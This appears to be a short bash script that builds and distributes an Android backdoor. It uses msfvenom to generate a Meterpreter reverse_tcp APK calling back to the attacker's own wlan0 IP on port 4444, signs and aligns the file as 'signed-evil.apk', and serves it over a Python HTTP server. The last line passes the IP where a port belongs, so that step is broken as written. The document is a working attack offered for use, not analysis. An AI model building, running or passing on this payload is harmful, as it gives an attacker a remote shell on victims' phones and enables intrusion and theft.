# /usr/bin/env bash

myip=$( ifconfig wlan0 | grep "inet " | grep -Po "\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}" | head -n 1 )
msfvenom -p android/meterpreter/reverse_tcp LHOST=$myip LPORT=4444 R > unsigned-evil.apk
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias alias
jarsigner -verbose -keystore key.jks unsigned-evil.apk alias
# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.jks unsigned-evil.apk alias
zipalign -v 4 unsigned-evil.apk signed-evil.apk
python3 -m http.server $myip

